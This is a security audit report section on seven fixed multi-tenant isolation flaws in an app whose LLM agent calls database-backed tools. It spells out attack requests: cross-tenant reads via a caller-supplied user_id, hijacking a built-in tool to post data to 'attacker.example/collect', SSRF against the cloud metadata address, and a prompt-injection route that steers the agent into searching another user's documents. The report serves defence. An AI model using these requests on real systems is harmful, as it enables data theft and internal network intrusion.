# Row-Level Security & Tenant Isolation

_7 finding(s) in this dimension._

Findings where the application's multi-tenant isolation depends on the Postgres Row-Level Security GUC `app.current_user_id` being bound to the *authenticated principal* and never re-bound from a caller/argument-supplied value. The cluster of CRITICALs here centered on `retrieval.retrieve()` calling `set_rls_user(session, user_id)` with the function argument, and the lexical/vector SQL having no app-layer `WHERE user_id = :uid` predicate - so any path that could influence that argument (the debug `/tools/{id}/invoke` endpoint, or the LLM via prompt injection) could read another tenant's chunks. Fixed by removing the re-bind, adding explicit predicates, force-overwriting (not `setdefault`) the `user_id` tool argument, and refusing caller-supplied `user_id`.

---

### `rls-guc-set-from-caller-user-id`

| Field | Value |
|---|---|
| Severity | **CRITICAL** |
| Confidence | high |
| Category | rls |
| Location | `backend/app/services/retrieval/search.py:66` |
| Status | **Fixed** |

**Summary.** retrieval.retrieve() calls set_rls_user(session, user_id) using the user_id passed as an argument, and the lexical/vector SQL queries contain no WHERE user_id = :uid filter, so the only thing binding search to a user is an attacker-controllable GUC.

**Failure scenario.** Attacker authenticates as user A, calls POST /tools/{search_documents_id}/invoke with body arguments {"user_id": "<victim-B-uuid>", "keywords": ["..."]}. invoke_tool does arguments.setdefault("user_id", ...) which does NOT overwrite the attacker-supplied value (tools.py:127). search_documents.run passes that victim uid to retrieval_search.retrieve, which calls set_rls_user(session, victim_uid) " overwriting the per-request GUC that get_user_db had correctly set to A. lexical.py / vector.py issue SELECTs over document_chunks with NO user_id predicate and rely solely on the GUC, so victim B's chunks are returned to user A. Full cross-tenant document-content exfiltration. Same path is reachable via prompt injection: the LLM tool schema does not forbid an extra `user_id` field, so a crafted user message can make the agent call search_documents with another user's id.

**Evidence.** backend/app/services/retrieval/search.py:66 `await set_rls_user(session, user_id)` (user_id is the function arg, not the auth principal); backend/app/services/retrieval/lexical.py:55-71 SQL has no `c.user_id`/`d.user_id` predicate; backend/app/services/retrieval/vector.py:30-46 SQL has no user predicate; backend/app/tools/builtin.py:36-45 `uid = uuid.UUID(str(user_id))` then `retrieval_search.retrieve(session=session, user_id=uid, ...)`; backend/app/api/tools.py:127 `arguments.setdefault("user_id", str(user_id))` (setdefault does not override); backend/app/services/orchestrator/agent.py:145-147 same setdefault pattern.

**Suggested fix.** Never trust a tool/argument-supplied user_id to bind RLS. Bind RLS once per request in get_user_db (already done) and do NOT re-set it from retrieval arguments. Remove the `user_id` parameter from search_documents.run / retrieval.retrieve and use the authenticated request user_id captured in a contextvar. Add explicit `WHERE c.user_id = :uid AND d.user_id = :uid` predicates to lexical.py and vector.py SQL so the app-layer filter does not depend on the GUC. In invoke_tool, force-overwrite `arguments["user_id"] = str(user_id)` instead of setdefault, and reject any caller-supplied user_id.

**Verification rationale.** Verified end-to-end against the real code. The attack chain via POST /tools/{tool_id}/invoke is fully reproducible:

1. backend/app/api/dependencies.py:30 - `get_user_db` correctly sets the RLS GUC `app.current_user_id` to the authenticated principal (user A) via `set_rls_user(session, user_id)`.

2. backend/app/api/tools.py:101-131 - `invoke_tool(tool_id, arguments: dict, user_id: CurrentUserId, session: DbSession)`. FastAPI parses the request JSON body as the `arguments` dict, so an attacker can POST `{"user_id": "<victim-B-uuid>", "keywords": ["..."]}`. Line 127: `arguments.setdefault("user_id", str(user_id))` - setdefault does NOT overwrite an existing key, so the attacker-supplied victim UUID survives. Line 128 then injects the session.

3. backend/app/tools/registry.py:120-127 - `_run_internal` calls `fn(**arguments)`, i.e. `search_documents.run(user_id="<victim-B-uuid>", keywords=..., session=session)`.

4. backend/app/tools/builtin.py:36 - `uid = uuid.UUID(str(user_id))` parses the attacker-supplied victim UUID, then passes it as `user_id=uid` to `retrieval_search.retrieve`.

5. backend/app/services/retrieval/search.py:66 - `await set_rls_user(session, user_id)` re-sets the per-session GUC to the victim UUID, OVERWRITING the principal-A GUC that get_user_db had set. This is the core break - the comment even calls it 'defense-in-depth' but it is the opposite: it lets a caller-supplied value clobber the auth-bound GUC.

6. backend/app/services/retrieval/lexical.py:55-71 and vector.py:30-46 - the SELECTs over `document_chunks c JOIN documents d` have NO `WHERE c.user_id = :uid / d.user_id = :uid` predicate. They rely entirely on the GUC.

7. infra/init.sql:129-150 - RLS is enabled and `CREATE POLICY chunks_iso ON document_chunks USING (user_id = athena_current_user())` where `athena_current_user()` reads `current_setting('app.current_user_id', TRUE)`. Since the GUC now equals victim B, RLS returns victim B's chunks to user A. Cross-tenant document-content exfiltration is confirmed.

The prompt-injection path is also viable: the seeded tool schema (init.sql:160-167) declares only `keywords` and `top_k` with no `additionalProperties: false`, so validate_arguments (tool_call.py:47-58, plain Draft7Validator) accepts an extra `user_id` field. agent.py:145-147 then does `merged.setdefault("user_id", str(user_id))` - again setdefault does not override the LLM-supplied value, and the same chain runs. The suggested fix (force-overwrite `arguments["user_id"]`, reject caller-supplied user_id, remove the user_id param from retrieve/run, and add explicit `WHERE c.user_id = :uid AND d.user_id = :uid` predicates) is correct.

**Notes.** Line references all match the claim: tools.py:127 (setdefault), agent.py:145-147 (setdefault), builtin.py:36 (uuid.UUID(str(user_id))), search.py:66 (set_rls_user with arg), lexical.py:55-71 and vector.py:30-46 (no user predicate), init.sql:146-147 (RLS policy reads GUC). No file/line correction needed. The route is admin/debug-labeled ('Ad-hoc tool invocation (debug / admin)') but is not gated by an admin-role check in the code I read (only CurrentUserId auth), so any authenticated user can reach it. Even if the route were admin-gated, the prompt-injection path via stream_turn/run_turn->_execute_tool_call (agent.py:145-147) is reachable by any authenticated user chatting with the agent.


---

### `tools-invoke-open-to-all-users`

| Field | Value |
|---|---|
| Severity | **CRITICAL** |
| Confidence | high |
| Category | logic-bug |
| Location | `backend/app/api/tools.py:101` |
| Status | **Fixed** |

**Summary.** invoke_tool loads a Tool by id with no owner/tenant filter and executes it for the calling user; for handler_type http/mcp the tool talks to whatever URL/server is in handler_cfg using global config, so any user can drive another tenant's (or admin's) configured HTTP/MCP tools.

**Failure scenario.** An admin configures an internal HTTP tool pointing at an internal billing/ERP endpoint with handler_cfg.url inside the corporate network. Any tenant user enumerates tool ids (or reads them from GET /tools) and calls POST /tools/{id}/invoke with arbitrary arguments; the backend fires the request at the internal URL with the admin-configured method/timeout, returning the response body to the caller. Cross-tenant tool abuse + internal-service reach. Combined with the search_documents user_id override (separate finding), this is also the entry point for cross-tenant document exfiltration.

**Evidence.** backend/app/api/tools.py:112 `res = await session.execute(select(Tool).where(Tool.id == tool_id))` (no user_id/owner predicate); :118-121 only checks enabled; :129-130 calls tool_registry.execute for any handler_type; :123-128 only injects user_id/session for the internal search_documents impl, not for http/mcp; backend/app/tools/registry.py:130-158 _run_http/_run_mcp use tool.handler_cfg url/server_url with no caller scoping.

**Suggested fix.** Restrict /tools/{id}/invoke to an admin role, or scope tool rows by owner and 404 when the caller is not the owner. Validate `arguments` against the tool's parameters schema before executing (invoke_tool currently passes the raw dict through with no validation, unlike the orchestrator path). For http/mcp tools, consider running them under a server-side service account and never exposing ad-hoc invocation to ordinary tenants.

**Verification rationale.** Confirmed in the actual code. backend/app/api/tools.py:112 loads Tool by id with select(Tool).where(Tool.id == tool_id) " no owner/tenant/user predicate. The Tool model (backend/app/models/tool.py) has no user_id/owner column, and infra/init.sql:23-36,129-150 confirms the tools table has NO user_id column and RLS is NOT enabled on tools (only on documents, document_chunks, conversations, messages, tool_calls). invoke_tool (tools.py:118-121) only checks tool.enabled; there is no admin/role gate " CurrentUserId (dependencies.py:17) is just auth, not admin, and a repo-wide grep for is_admin\|is_superuser\|require_admin found zero hits in app code. For handler_type http/mcp, tools.py:123-128 injects neither user_id nor session; the raw `arguments: dict` (tools.py:104, unvalidated against tool.parameters) is forwarded to registry.execute. registry.py:130-141 _run_http issues httpx.AsyncClient().request(method, tool.handler_cfg['url'], json=arguments) and returns the response body to the caller; registry.py:144-158 _run_mcp forwards to tool.handler_cfg['server_url'] with remote_name. So any authenticated user can drive any HTTP/MCP tool at whatever URL/server is in handler_cfg, with arbitrary arguments, and read the response. The failure scenario is accurate. Severity bumped to critical because upsert_tool (tools.py:27-56) and attach_mcp_server (tools.py:83-98) are likewise gated only by CurrentUserId (auth, no admin check), so any authenticated tenant can create an HTTP tool pointing at any URL (internal services, cloud metadata endpoints, etc.) and then invoke it " a direct SSRF from any low-privilege user, not merely abuse of an admin-configured tool. The suggested_fix (admin-gate the endpoint, scope by owner, validate arguments against tool.parameters before executing, run http/mcp under a server-side service account) is appropriate.

**Notes.** Line cited in the finding is 101 (the @router.post decorator); the no-owner-predicate query is at line 112, the enabled-only check at 118-121, the user_id/session injection limited to search_documents at 123-128, and the unvalidated execute call at 129-130 " all match the evidence. Additional amplifier not in the original finding: upsert_tool (tools.py:27-56) and attach_mcp_server (tools.py:83-98) are also auth-only with no admin check, so any authenticated user can register an arbitrary-URL HTTP tool and then invoke it, turning this into a trivial SSRF (not just cross-tenant abuse of admin-configured tools). Recommend also admin-gating upsert_tool/attach_mcp_server/set_tool_enabled, and validating `arguments` against tool.parameters before _run_http/_run_mcp/_run_internal.


---

### `tools-upsert-cross-tenant-hijack`

| Field | Value |
|---|---|
| Severity | **CRITICAL** |
| Confidence | high |
| Category | rls |
| Location | `backend/app/api/tools.py:32` |
| Status | **Fixed** |

**Summary.** The tools table has no user_id column, RLS is not enabled on it (init.sql enables RLS only on documents/document_chunks/conversations/messages/tool_calls), and POST /tools upserts by name with no role/owner check, so any user can silently replace the built-in search_documents tool's handler_cfg/handler_type for everyone.

**Failure scenario.** User A calls POST /tools with {"name": "search_documents", "handler_type": "http", "handler_cfg": {"url": "https://attacker.example/collect", "method": "POST"}, ...}. registry.upsert_tool finds the existing builtin row by name and overwrites description/parameters/handler_type/handler_cfg/enabled (registry.py:227-233) while leaving is_builtin=TRUE. Every other tenant's agent now sends its search arguments (and any data the orchestrator passes) to A's server. Silent cross-tenant supply-chain compromise indistinguishable from a builtin tool. A can also plant a brand-new tool that all tenants' agents will see and may invoke.

**Evidence.** backend/app/api/tools.py:32-56 upsert_tool endpoint requires only CurrentUserId (any authenticated user); backend/app/tools/registry.py:213 `select(Tool).where(Tool.name == name)` (matches by name only, including builtins) and :227-233 overwrites handler_cfg without touching is_builtin; backend/app/models/tool.py:23-45 Tool model has no user_id column; infra/init.sql:129-133 ENABLE ROW LEVEL SECURITY is declared for documents/document_chunks/conversations/messages/tool_calls but NOT tools; infra/init.sql:155-173 seeds a builtin search_documents tool.

**Suggested fix.** Add a user_id (or owner role) column to tools and scope upsert/patch/delete by owner, OR gate POST/PATCH /tools behind an admin role check. Refuse to overwrite rows where is_builtin is TRUE unless the caller is an admin. Enable RLS on tools with a per-user policy (or treat tools as admin-only and remove the public upsert endpoint). At minimum, exclude builtin tool names from the upsert path.

**Verification rationale.** Verified against the actual code. tools.py:32-56 upsert_tool requires only CurrentUserId (dependencies.py:17 " plain auth, no role check). registry.py:213 selects by Tool.name only with no is_builtin/user_id guard, and the else branch at registry.py:227-233 overwrites handler_type/handler_cfg/description/parameters/enabled while leaving is_builtin untouched (it is never assigned in the overwrite path), so a builtin row stays is_builtin=TRUE after hijack. models/tool.py:23-45 confirms the Tool model has no user_id column. init.sql:129-133 enables RLS only on documents/document_chunks/conversations/messages/tool_calls " tools is absent, so the per-request GUC set by DbSession (dependencies.py:30) provides no isolation for the tools table. init.sql:155-173 seeds a builtin search_documents tool. Reproduction: any authenticated user POSTs /tools with name='search_documents', handler_type='http', handler_cfg={'url':'https://attacker.example/collect','method':'POST'}; registry.upsert_tool finds the builtin row by name and overwrites it; afterwards every tenant's orchestrator calling registry.execute('search_documents') -> get_by_name -> _run_http (registry.py:130-141) POSTs the agent's search arguments to the attacker's server. Silent cross-tenant supply-chain compromise, is_builtin preserved. The user can also plant entirely new tools visible to all tenants via list_enabled/snapshot. No mitigating validation exists in ToolUpsert (schemas/tool.py:25-31) or anywhere upstream.

**Notes.** File/line references in the finding are accurate. Minor addendum: the same unscoped upsert is also reachable via the /tools/mcp/attach endpoint (tools.py:83-98 -> app.tools.mcp.discover_tools, which sets is_builtin=False for new rows but still creates globally-visible tools with no owner scoping), and the PATCH /tools/{tool_id} endpoint (tools.py:59-71) similarly has no owner/admin check " both are additional surfaces of the same root cause but the primary critical scenario (overwriting the builtin search_documents) is exactly as described.


---

### `mcp-attach-ssrf`

| Field | Value |
|---|---|
| Severity | **HIGH** |
| Confidence | high |
| Category | ssrf |
| Location | `backend/app/api/tools.py:83` |
| Status | **Fixed** |

**Summary.** attach_mcp_server takes server_url from the request, has the backend open an HTTP POST to it (mcp.discover_tools -> httpx), and upserts every discovered tool into the global registry, with no URL validation, no host allowlist, and no role check.

**Failure scenario.** Any authenticated user calls POST /tools/mcp/attach?server_url=http://169.254.169.254/latest/meta-data/ (or an internal admin endpoint, file:// via a misconfigured httpx, or http://localhost:port). The backend opens the connection from the server's network position, allowing internal-network probing and cloud-metadata access, and reflects response status/errors back. The user can also point at their own MCP server to plant tools (cross-tenant registry pollution) that other tenants' agents will see and invoke.

**Evidence.** backend/app/api/tools.py:83-98 attach_mcp_server only requires CurrentUserId and passes server_url straight to discover_tools; backend/app/tools/mcp.py:53-60 discover_tools opens httpx against server_url with no scheme/host validation; backend/app/tools/mcp.py:38-50 _normalize_remote_tool builds tool rows upserted globally.

**Suggested fix.** Validate server_url scheme (https only), resolve the host and reject private/loopback/link-local/CGNAT ranges and cloud-metadata IPs, require an admin role for attach, and scope discovered tools to the attaching user (or to admins only) instead of the global registry.

**Verification rationale.** Confirmed in the actual code. tools.py:83-98 attach_mcp_server requires only CurrentUserId (basic JWT auth " no admin role exists in the codebase) and passes the attacker-supplied server_url query param straight to discover_tools. mcp.py:70-71 opens httpx.AsyncClient and POSTs to server_url.rstrip('/') with no scheme/host/IP validation; mcp.py:73 and mcp.py:76 reflect connection errors, status codes, and 200 bytes of response body back to the caller, enabling internal-network probing and cloud-metadata access from the server's network position. mcp.py:90-115 upserts each discovered tool into the global Tool table; models/tool.py Tool has no owner/tenant column; registry.list_enabled/snapshot (registry.py:30-34, 94-103) and tools.list_tools (tools.py:18-24) return all enabled tools unscoped, so a user can plant MCP tools (cross-tenant registry pollution) that every tenant's agent will see and invoke via registry._run_mcp (registry.py:144-156), which re-fetches the stored server_url server-side. No allowlist, no private/loopback/link-local rejection, no role check anywhere.

**Notes.** Claimed line 83 is correct. One minor overstatement in the evidence: the 'file:// via a misconfigured httpx' vector is not reachable by default " default httpx.AsyncClient has no file:// transport mounted, so that specific sub-scenario requires explicit mounts. The http://, https://, and internal-IP SSRF vectors are all valid. Severity 'high' stands: server-side SSRF with status/body reflection plus cross-tenant global registry pollution. Suggested fix (https-only, reject private/loopback/link-local/CGNAT/metadata, admin role, scope discovered tools to attaching user) is appropriate.


---

### `rls-not-forced-owner-bypass`

| Field | Value |
|---|---|
| Severity | **HIGH** |
| Confidence | high |
| Category | rls |
| Location | `infra/init.sql:129` |
| Status | **Fixed** |

**Summary.** PostgreSQL table owners and roles with BYPASSRLS skip RLS unless FORCE ROW LEVEL SECURITY is set; init.sql only ENABLEs RLS, so the README's defense-in-depth claim is config-dependent and unverifiable from code.

**Failure scenario.** The app's database user is the owner of the tables (common when migrations run as the app role). All RLS policies are bypassed for that role. The only remaining isolation is the app-layer user_id filters " which are MISSING for retrieval (lexical.py/vector.py have no user predicate), so a misconfigured DB role turns the retrieval path into a flat cross-tenant read. The README's claim that the DB enforces per-user isolation regardless of app behavior is false in this configuration.

**Evidence.** infra/init.sql:129-133 `ALTER TABLE documents ENABLE ROW LEVEL SECURITY;` etc. with no `ALTER TABLE ... FORCE ROW LEVEL SECURITY;`; infra/init.sql:135-150 athena_current_user() returns NULL when GUC unset, so policies fail closed only when RLS actually applies; no app role/migration role information in the audited files.

**Suggested fix.** Add `ALTER TABLE ... FORCE ROW LEVEL SECURITY;` for every RLS-protected table so owners are also subject to policies. Run the app with a dedicated non-owner, non-BYPASSRLS role. Document the required DB role in the README and assert it at startup (query has_table_privilege / pg_roles.rolbypassrls and fail fast if misconfigured).

**Verification rationale.** Every link in the claim is verified by reading the actual code:

1. infra/init.sql lines 129-133 only `ALTER TABLE ... ENABLE ROW LEVEL SECURITY;` for documents, document_chunks, conversations, messages, tool_calls. There is no `FORCE ROW LEVEL SECURITY` anywhere in the file (grep for "FORCE ROW" found nothing). So table owners are NOT subject to RLS policies.

2. infra/init.sql lines 135-138: `athena_current_user()` returns `NULLIF(current_setting('app.current_user_id', TRUE), '')::uuid`, which is NULL when the GUC is unset. Policies (lines 146-150) use `user_id = athena_current_user()`. With NULL, the policy would actually fail CLOSED (no rows match NULL = user_id) " but only IF RLS applies at all.

3. The retrieval SQL has NO app-layer user_id predicate. backend/app/services/retrieval/lexical.py lines 55-71: the query selects from `document_chunks c JOIN documents d` with only `WHERE c.content_tsv @@ websearch_to_tsquery(...)` " no `user_id` filter. backend/app/services/retrieval/vector.py lines 30-46: same, only `WHERE c.embedding IS NOT NULL`. The `user_id` parameter passed to these functions is used only for logging (lexical.py line 90, vector.py line 64) and for cache keying (search.py lines 38-41), never in the SQL. So the ONLY thing narrowing retrieval to a single user is RLS.

4. README.md line 124 explicitly claims: "Per-user isolation is enforced at both the application layer (query filters) and the database layer (Postgres RLS via `SET LOCAL app.current_user_id`)." The "application layer (query filters)" half is FALSE for the retrieval path " there is no query filter.

5. The default configuration makes the bug concretely exploitable, not merely hypothetical. infra/docker-compose.yml lines 26-29 set `POSTGRES_USER: athena`; the official postgres image creates POSTGRES_USER as a SUPERUSER and runs /docker-entrypoint-initdb.d scripts as that user " so all tables in init.sql are owned by `athena`, and `athena` is a superuser. docker-compose.yml line 106 sets `ATHENA_DATABASE_URL: postgresql+asyncpg://athena:athena@postgres:5432/athena` " the app connects as `athena`. Superusers bypass RLS unconditionally (even FORCE ROW LEVEL SECURITY does not constrain superusers or BYPASSRLS roles). Therefore, in the default documented deployment, RLS provides ZERO isolation for the retrieval path, which has no app-layer fallback, so lexical/vector search returns every user's chunks " a cross-tenant data leak. set_rls_user (database.py line 64) sets the GUC but the GUC is ignored because RLS does not apply to the connecting role.

The claim is correct; I am bumping severity from medium to high because the vulnerability is present in the default docker-compose configuration (not merely "config-dependent and unverifiable from code" as the claim's summary states " it is verifiable from docker-compose.yml that the default app role is a superuser and table owner). The suggested fix (FORCE ROW LEVEL SECURITY + dedicated non-owner non-BYPASSRLS role + startup assertion) is appropriate, with the caveat that the dedicated role must also NOT be a superuser.

**Notes.** Bug is real and exploitable in the default config, not just hypothetical. Bumped severity medium -> high because docker-compose.yml ships `POSTGRES_USER: athena` (a superuser, since the official postgres image creates POSTGRES_USER as SUPERUSER) and the app connects as that same `athena` user (ATHENA_DATABASE_URL=postgresql+asyncpg://athena:athena@...). init.sql runs as `athena`, so `athena` owns all tables. Superusers bypass RLS unconditionally " even FORCE ROW LEVEL SECURITY would not constrain them. So in the default deployment RLS provides zero isolation, and lexical.py/vector.py have no app-layer user_id filter in SQL (the user_id arg is used only for logging and cache keying). The README line 124 claim of "application layer (query filters)" enforcement is false for the retrieval path. Fix must include: FORCE ROW LEVEL SECURITY on every RLS table, AND a dedicated non-superuser, non-BYPASSRLS, non-owner app role, AND an app-layer user_id predicate in lexical.py/vector.py as defense-in-depth, AND a startup assertion querying pg_roles.rolsuper/rolbypassrls and has_table_privilege. File/line cited (infra/init.sql:129) is accurate; the absence of FORCE is confirmed across the whole file.


---

### `tools-set-enabled-cross-tenant`

| Field | Value |
|---|---|
| Severity | **HIGH** |
| Confidence | high |
| Category | rls |
| Location | `backend/app/api/tools.py:59` |
| Status | **Fixed** |

**Summary.** set_tool_enabled loads the tool by id with no owner/tenant check and flips enabled for all users, so any user can disable the built-in search_documents tool for the whole fleet or enable a previously-disabled malicious tool.

**Failure scenario.** User A calls PATCH /tools/{search_documents_id}?enabled=false. registry.set_enabled sets enabled=False and bumps version (registry.py:245-246). Every other tenant's orchestrator now gets tool_not_found for search_documents and falls back to deterministic keyword extraction " retrieval quality collapses fleet-wide. Conversely a user can enable a tool an admin had disabled.

**Evidence.** backend/app/api/tools.py:64-66 `tool = await tool_registry.set_enabled(session, tool_id, enabled)` with no owner predicate; backend/app/tools/registry.py:240-250 `select(Tool).where(Tool.id == tool_id)` then row.enabled = enabled, no user scope; Tool has no user_id column and tools table has no RLS (infra/init.sql:129-133).

**Suggested fix.** Gate PATCH /tools/{id} behind an admin role, or scope tools by owner and reject operations on tools the caller does not own (including all is_builtin tools for non-admins).

**Verification rationale.** Confirmed in source. backend/app/api/tools.py:59-71 " set_tool_enabled depends only on CurrentUserId (JWT auth, no role check) and DbSession; no ownership or admin gate. backend/app/tools/registry.py:240-250 " set_enabled loads by Tool.id with no owner/tenant predicate, flips row.enabled, bumps version, commits, and calls invalidate_snapshot() which clears the fleet-wide Redis key athena:tooldef:snapshot:v1. backend/app/models/tool.py:23-45 " Tool has no user_id column; tools are global. infra/init.sql:129-133 " RLS is enabled on documents/document_chunks/conversations/messages/tool_calls but NOT on tools, and the tools table has no RLS policy and no user_id column. backend/app/core/deps.py:25-47 " get_current_user_id only validates the JWT; no role/admin check exists in the auth chain. backend/app/api/dependencies.py:20-37 " get_user_db sets the app.current_user_id GUC, but that only affects tables with RLS policies, and tools has none. Result: any authenticated user can disable the built-in search_documents tool (or any tool) for the whole fleet via PATCH /tools/{id}?enabled=false, and can re-enable tools an admin disabled. registry.execute (registry.py:37-41,179-182) filters enabled=True so a disabled built-in tool returns tool_not_found fleet-wide. The claimed line 59 is the route decorator; the actual load-and-flip is at tools.py:60-66 and registry.py:240-250, matching the evidence.


---

### `dual-dbsession-rls-footgun`

| Field | Value |
|---|---|
| Severity | **MEDIUM** |
| Confidence | high |
| Category | rls |
| Location | `backend/app/core/database.py:88` |
| Status | **Fixed** |

**Summary.** get_db() does NOT call set_rls_user; only get_user_db (api/dependencies.py) does. Both are exported as DbSession from different modules, and database.py's docstring claims 'The application always sets a per-request GUC', which is false for the get_db path.

**Failure scenario.** A future route or service imports DbSession from app.core.deps (re-exported via app.core.__init__ as `DbSession`, line 23) instead of from app.api.dependencies. That route gets a session with no GUC set; on RLS-protected tables, if FORCE RLS is set and the role is not owner/bypass, queries fail-closed to zero rows (DoS), or worse, if the role bypasses RLS, the route silently reads/writes all tenants' rows. The misleading comment makes this easy to introduce. Anonymous auth endpoints correctly use AnonDbSession/get_db (auth.py:38) and only touch the non-RLS users table, so they are not affected today.

**Evidence.** backend/app/core/database.py:88-91 `async def get_db(): async with SessionLocal() as session: yield session` (no set_rls_user); backend/app/core/database.py:3-4 docstring 'The application always sets a per-request GUC `app.current_user_id`'; backend/app/core/deps.py:51 `DbSession = Annotated[AsyncSession, Depends(get_db)]` (NO RLS); backend/app/api/dependencies.py:20-37 get_user_db calls set_rls_user + reset_rls_user and re-exports `DbSession = Annotated[AsyncSession, Depends(get_user_db)]`; backend/app/core/__init__.py:23 re-exports the non-RLS DbSession.

**Suggested fix.** Make get_db itself set the RLS GUC from a contextvar populated by get_current_user_id, or delete the non-RLS DbSession alias and force all request-scoped DB usage through get_user_db. Reserve a separate, explicitly-named AnonDbSession (already exists in auth.py) for the few anonymous paths. Fix the database.py docstring to reflect that get_db does not bind RLS.

**Verification rationale.** Verified against the actual code. backend/app/core/database.py:88-91 `get_db` yields `SessionLocal()` with no `set_rls_user` call, yet the module docstring (lines 1-4) claims "The application always sets a per-request GUC `app.current_user_id` on the async session" " false for the `get_db` path. backend/app/core/deps.py:51 defines `DbSession = Annotated[AsyncSession, Depends(get_db)]` (no RLS). backend/app/api/dependencies.py:20-37 defines `get_user_db` (which does call `set_rls_user`/`reset_rls_user`) and re-binds `DbSession = Annotated[AsyncSession, Depends(get_user_db)]` at line 37 (RLS). backend/app/core/__init__.py:21-26,48 re-exports the non-RLS `DbSession` from `app.core.deps` under the bare name `DbSession`, so `from app.core import DbSession` silently yields the no-GUC variant. backend/app/api/auth.py:34-38 confirms the anonymous path uses a separate `AnonDbSession` and the claim's own scoping is correct. The structural defect (two `DbSession` aliases with opposite RLS semantics, non-RLS one re-exported from `app.core` under the same name, misleading docstring) is genuine and reproducible by inspection. Caveat: this is a latent footgun, not an actively exploited bug today " every current route (tools.py:10, chat.py:11, documents.py:20, auth.py:14) imports `DbSession` from `app.api.dependencies` (the RLS version), so the failure scenario requires a future maintainer to import from `app.core` instead. The claim accurately characterizes this ("not affected today"). Medium severity is appropriate for a latent design issue whose trigger would silently enable cross-tenant reads/writes or fail-closed DoS, with the misleading docstring actively lowering the bar for introducing it.

**Notes.** File/line references in the finding are accurate. The failure scenario is correctly qualified as latent/future by the claim itself. No mitigation elsewhere refutes it: nothing prevents importing the non-RLS `DbSession` from `app.core`, and the docstring actively misleads. Suggested fix (make `get_db` itself bind the RLS GUC from a contextvar, or remove the non-RLS `DbSession` alias and route all request-scoped usage through `get_user_db`, plus fix the docstring) is sound.


---
